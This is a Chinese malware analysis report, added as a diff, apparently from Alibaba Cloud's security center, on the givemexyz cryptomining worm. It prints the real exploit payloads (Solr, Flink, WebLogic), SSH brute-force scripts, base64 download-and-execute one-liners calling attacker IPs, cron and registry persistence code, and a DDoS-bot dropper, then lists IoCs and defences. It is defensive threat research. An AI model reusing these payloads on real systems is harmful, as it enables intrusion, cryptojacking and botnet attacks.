@@ -1,0 +1,297 @@
+## 一、概述
+
+阿里云安全中心，监控到givemexyz挖矿家族在云上持续活跃。该家族通过使用服务器弱口令、Web漏洞、中间件漏洞等进行传播。并且该家族使用bash、python、powershell等恶意脚本进行批量攻击，具备跨平台传播的能力。因传播范围广、影响范围大，并有愈演愈烈的趋势，因此有必要对其利用方式进行纰漏。
+
+## 二、详细分析
+
+### 0x1: 攻击利用
+
+首先分析givemexyz家族使用的武器化漏洞。从漏洞类型区分，该家族主要使用Web RCE、中间件未授权访问、暴力破解进行攻击。
+
+#### Apache solr RCE漏洞(CVE-2019-0193)
+
+    
+    
+    <datasource type="urldatasource"/>
+        <script><![cdata[
+              function poc(){ java.lang.runtime.getruntime().exec("powershell iex(new-object net.webclient).downloadstring('http://209.141.40.190/xms.ps1')");
+              }
+      ]]></script>
+      <document>
+        <entity name="stackoverflow"
+                url="https://stackoverflow.com/feeds/tag/solr"
+                processor="xpathentityprocessor"
+                foreach="/feed"
+                transformer="script:poc" />
+      </document>
+    
+
+#### Apache Flink 任意文件上传(CVE-2020-17518)
+
+    
+    
+    /jars/d847111f-cd11-4b14-b05a-9e38c3a2084a_check-execute.jar/run?entry-class=Execute&program-args=%22nohup%20echo%20cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9lZS5weSIpLnJlYWQoKSkn%20%7C%20base64%20-d%20%7C%20bash%20-%22
+    
+
+#### Weblogic Console HTTP协议RCE(CVE-2020-14882)
+
+    
+    
+    /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]%7B%22cmd.exe%22,%20%22/c%22,%20%22powershell%20iex(New-Object%20Net.WebClient).DownloadString('http://209.141.40.190/xms.ps1')%22%7D%20:%20new%20String[]%7B%22/bin/sh%22,%20%22-c%22,%20%22curl%20-s%20http://209.141.40.190/xms%20%7C%20bash%20-sh;%20wget%20-q%20-O%20-%20http://209.141.40.190/xms%20%7C%20bash%20-sh;%20echo%20cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc=%20%7C%20base64%20-d%20%7C%20bash%20-;%20lwp-download%20http://209.141.40.190/xms%20/tmp/xms;%20bash%20/tmp/xms;%20rm%20-rf%20/tmp/xms%22%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();')
+    
+
+暴力破解
+
+除利用上述比较新的漏洞外，givemexyz家族还在使用Weblogic WLS 组件(CVE-2017-10271)、Hadoop
+未授权访问、docker remote
+api未授权访问、Weblogic反序列化远程代码执行（CVE-2019-2725）等漏洞利用，并不断使用新披露的漏洞进行攻击扫描。
+
+不仅如此，从攻击者使用的“http://209.141.40.190/scan.sh”恶意脚本中可以看出，该家族一直内置暴力破解扫描模块，不断进行对外扫描。
+
+    
+    
+    #!/bin/bash
+    
+    ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1 > /var/tmp/ranges.txt
+    
+    cat /var/tmp/ranges.txt | while read line; do
+        nohup /var/tmp/scan $line.0.0-$line.255.255 22 > /var/tmp/ssh_vuln.txt
+        cat /var/tmp/ssh_vuln.txt | grep 'OpenSSH' | awk '{print $1}' | uniq | shuf > /var/tmp/sshcheck
+        nohup /var/tmp/hxx 300 -f /var/tmp/sshcheck /var/tmp/ps 22 'curl -s http://209.141.40.190/xms | bash -sh; wget -q -O - http://209.141.40.190/xms | bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9kLnB5IikucmVhZCgpKSc= | base64 -d | bash -; lwp-download http://209.141.40.190/xms /var/tmp/xms; bash /var/tmp/xms; rm -rf /var/tmp/xms' >/dev/null 2>&1
+    done
+    
+
+路径| md5| 作用  
+---|---|---  
+/var/tmp/scan| b42183f226ab540fb07dd46088b382cf| 内网SSH端口扫描  
+/var/tmp/hxx| f0551696774f66ad3485445d9e3f7214| SSH暴力破解、远程执行程序  
+  
+### 0x2: 恶意代码分析
+
+攻击者利用漏洞，在受害者机器上远程执行恶意脚本代码。  
+如果是Linux机器，则执行如下命令：
+
+    
+    
+    /bin/sh -c nohup echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDkuMTQxLjQwLjE5MC9lZS5weSIpLnJlYWQoKSkn | base64 -d | bash -          ->    python -c 'import urllib;exec(urllib.urlopen("http://209.141.40.190/ee.py").read())'
+    
+
+givemexyz家族Linux版本的攻击流程如下：
+
+![image](https://image.3001.net/images/20210226/1614323836_6038a07c76be5f32a254d.png!small)
+
+攻击流程中涉及的恶意文件功能：
+
+文件名| 文件类型| 文件功能  
+---|---|---  
+ee.py| python脚本| 载荷投递  
+hxx| 二进制程序| SSH暴力破解、远程执行程序  
+ps| 文本| 弱口令账户密码字典  
+scan| 二进制程序| 内网SSH端口扫描  
+scan.sh| bash脚本| 端口扫描、暴力破解攻击、横向移动  
+xms| bash脚本| 载荷投递、通过证书横向移动、植入持久化、杀竞品及安全软件、下载并运用挖矿软件  
+d.py/dd.py| python脚本| 载荷投递、植入持久化  
+go| 二进制程序| 执行挖矿程序  
+dbusex| 二进制程序| 挖矿程序  
+b.py| python脚本| 载荷投递  
+x64b/x32b| 二进制程序| DDOS攻击、SYN flood、UDP flood、中控  
+  
+如果是windows机器，则执行如下命令：
+
+    
+    
+    powershell iex(New-Object Net.WebClient).DownloadString('http://209.141.40.190/xms.ps1')
+    
+
+givemexyz家族Windows版本的攻击流程如下：
+
+![image](https://image.3001.net/images/20210226/1614324381_6038a29d53ef739a447e3.png!small)
+
+攻击流程中涉及的恶意文件功能：
+
+文件名| 文件类型| 文件功能  
+---|---|---  
+xms.ps1| powershell脚本| 载荷投递  
+xmr32.exe/xmr64.exe| 二进制程序| 挖矿程序  
+mywindows.exe| 二进制程序| 挖矿程序  
+r.vbs| vbs脚本| 载荷投递、植入持久化  
+nazi.exe| 二进制程序| 挖矿程序、植入持久化  
+cudas.exe| 二进制程序| 挖矿程序  
+  
+### 0x3: 持久化控制
+
+以便客户可以清理此蠕虫家族的持久化，我们着重分析下givemexyz家族的持久化方式。  
+givemexyz家族的Linux版本通过恶意脚本植入定时任务、自启动项以及后门程序进行持久化控制。
+
+    
+    
+    #!/bin/bash
+    
+    if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
+    then
+            url="bash.givemexyz.in"
+            base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"
+    else
+            url="194.5.249.238"
+            base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuNS4yNDkuMjM4L2QucHkiKS5yZWFkKCkpJw=="
+    fi
+    
+    if if cat /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down | grep -q "205.185.116.78\|5.196.247.12\|bash.givemexyz.xyz\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc=\|209.141.40.190"
+    then
+        chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down
+        crontab -r
+        echo "Cron not found"
+        echo -e "*/1 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/root
+        echo -e "*/2 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/apache
+        echo -e "*/3 * * * * root /dev/shm/dbusex -c $dns && /home/`whoami`/dbusex -c $dns && /var/run/dbusex -c $dns && /root/dbusex -c $dns\n##" > /etc/cron.d/nginx
+        echo -e "*/30 * * * *   (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms\n; rm -rf /tmp/xms\n##" > /var/spool/cron/root
+        echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjE5Nc41LjI0OS4yMzgiCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh4T1RRdU5TNHlORGt1TWpNNEwyUXVjSGtpS1M1eVpXRmtLQ2twSnc9PSIKZmkKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8tIGh0dHA6Ly8kdXJsL3htcyl8YmFzaCAtc2g7IGVjaG8gJGJhc2UgfCBiYXNlNjQgLWQgfCBiYXNoIC07IGx3cC1kb3dubG9hZCBodHRwOi8vJHVybC94bXMgL3RtcC94bXM7IGJhc2ggL3RtcC94bXM7IHJtIC1yZiAvdG1wL3htcycgPiAvZXRjL2luaXQuZC9kb3du | base64 -d | bash -        mkdir -p /var/spool/cron/crontabs
+        echo -e "* * * * *  (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /var/spool/cron/crontabs/root
+        mkdir -p /etc/cron.hourly
+        echo "(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
+    
+    fi
+    
+
+受此蠕虫危害的机器，可以根据植入持久化的位置进行自排查以及清理。
+
+    
+    
+    import urllib
+    import platform
+    import os
+    if platform.architecture()[0] == "64bit":
+        urlx64 = "http://39.96.117.48/x64b"
+        try:
+            f = urllib.urlopen(urlx64)
+            if f.code == 200:
+                data = f.read()
+                with open ("/tmp/x64b", "wb") as code:
+                    code.write(data)
+            os.chmod("/tmp/x64b", 0o777)
+            os.system("/tmp/x64b")
+        except:
+            pass
+    else:
+        urlx32 = "http://39.96.117.48/x32b"
+        try:
+            y = urllib.urlopen(urlx32)
+            if y.code == 200:
+                data = y.read()
+                with open ("/tmp/x32b", "wb") as code:
+                    code.write(data)
+            os.chmod("/tmp/x32b", 0o777)
+            os.system("/tmp/x32b")
+        except:
+            pass
+    
+
+同时该蠕虫还会使用python下载恶意的后门程序。
+
+文件名| MD5| 二进制功能  
+---|---|---  
+/tmp/x64b、/tmp/x32b| c4d44eed4916675dd408ff0b3562fb1f| DDOS攻击、SYN flood、UDP
+flood、中控  
+  
+windows版本的持久化方式则是：  
+1.通过释放快捷方式到自启动文件夹持久化:  
+释放启动快捷方式使用的是启动vbs脚本, 该脚本如下:
+
+    
+    
+    Set objFSO=CreateObject("Scripting.FileSystemObject")
+    outFile="C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pFWPPQezaQ.url"
+    Set objFile = objFSO.CreateTextFile(outFile,True)
+    objFile.Write "[InternetShortcut]" & vbCrLf & "URL=""file:///C:\ProgramData\ALmRPARcYN\mywindows.exe"""
+    objFile.Close
+    
+
+2.向注册表写入启动项的方式用于持久化:  
+样本会将自身程序路径加入到注册表启动列表，并将名称伪装成正常的oracle进程。
+
+    
+    
+    注册表路径: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\oracleservice.exe
+    
+
+同时为了躲避隐藏，样本会启动正常系统白进程当做傀儡进程，执行自身的恶意代码，用于躲避恶意检测。
+
+如果用户发现自身系统正常进程cpu使用率飙升，那么可以怀疑是否是样本使用正常系统进程做外壳用于挖矿。
+
+## 三、家族判断
+
+通过对恶意文件的分析以及中控域名/IP的关联，可以将此次事件和StartMiner(8220挖矿家族)关联起来。除此之外，在原有的基础上于2021-01-28
+03:28:41分增加了对windows系统的挖矿。因使用的中控域名都含有givemexyz字眼，所以我们将该家族命名为givemexyz。
+
+![image](https://image.3001.net/images/20210226/1614325068_6038a54ccb5dde96ff48e.png!small)
+
+我们根据givemexyz家族域名/IP等IOC的变换周期、受影响范围等因素计算了该家族的活跃系数。可以看出该家族在2019年下半年开始活跃，并且从2020年下半年开始有爆发的趋势。该蠕虫不针对具体行业进行攻击，而是无差别利用漏洞进行横向移动。
+
+## 四、应急响应
+
+阿里云安全中心，为客户提供企业级别的全方位应急响应能力。
+
+威胁检测
+
+250+ 威胁检测模型为客户提供全链路的威胁检测能力，我们第一时间对蠕虫使用的变种恶意脚本、恶意程序、持久化进行捕获检测。  
+蠕虫家族使用的web漏洞、中间件漏洞进行检测：
+
+![image](https://image.3001.net/images/20210226/1614325233_6038a5f1975e215f81cee.png!small)
+
+蠕虫使用的bash、python、powershell等批量攻击脚本进行检测：
+
+![image](https://image.3001.net/images/20210226/1614325278_6038a61e63b4ac99d76fd.png!small)
+
+![image](https://image.3001.net/images/20210226/1614325310_6038a63eba9f3b6fd96d2.png!small)
+
+![image](https://image.3001.net/images/20210226/1614325344_6038a6609a741f289d6ef.png!small)
+
+蠕虫使用的挖矿程序、后门程序进行检测：
+
+![image](https://image.3001.net/images/20210226/1614325393_6038a691656a2528044d2.png!small)
+
+防御阻断
+
+云安全中心不仅对入侵事件进行全方位的检测，同时我们还提供事前的防御拦截能力。从主机层面对恶意网络连接、暴力破解攻击、恶意DNS连接、恶意命令进行阻断。
+
+![image](https://image.3001.net/images/20210226/1614325463_6038a6d70f7e07a8b6edc.png!small)
+
+一键清理
+
+对蠕虫家族使用的持久化技术，云安全中心提供闭环能力，可以对其一键处理。
+
+![image](https://image.3001.net/images/20210226/1614325541_6038a7251d21c8da88ab3.png!small)
+
+## 五、IoCs
+
+givemexyz家族此次活跃IOC如下：
+
+IOC  
+---  
+http://209[.]141[.]40[.]190/xms.ps1  
+http://209[.]141[.]40[.]190/xms  
+http://209[.]141[.]40[.]190/scan.sh  
+http://39[.]96[.]117[.]48/x64  
+http://39[.]96[.]117[.]48/x32b  
+http://209[.]141[.]40[.]190/ee.py  
+http://209[.]141[.]40[.]190/hxx  
+http://209[.]141[.]40[.]190/ps  
+http://209[.]141[.]40[.]190/scan  
+http://209[.]141[.]40[.]190/d.py  
+http://194[.]5[.]249[.]238/x86_64  
+http://194[.]5[.]249[.]238/i686  
+http://194[.]5[.]249[.]238/go  
+http://bash[.]givemexyz[.]in/dd.py  
+http://194[.]5[.]249[.]238/d.py  
+http://209[.]141[.]40[.]190/xmr32.exe  
+http://209[.]141[.]40[.]190/xmr64.exe  
+http://209[.]141[.]40[.]190/mywindows.exe  
+http://209[.]141[.]40[.]190/nazi.exe  
+http://209[.]141[.]40[.]190/cudas.exe  
+  
+## 六、安全建议
+
+1.我们开放了部分检测能力(恶意文件检测)至阿里云免费用户，免费用户可以登录云安全中心的控制台查看告警信息，并根据告警信息排查入侵来源并修复漏洞。
+
+2.企业版的用户可以开启防病毒、恶意网络行为等防御能力，进行事前阻断。并且可以通过病毒防御功能进行一健体检清理。
+
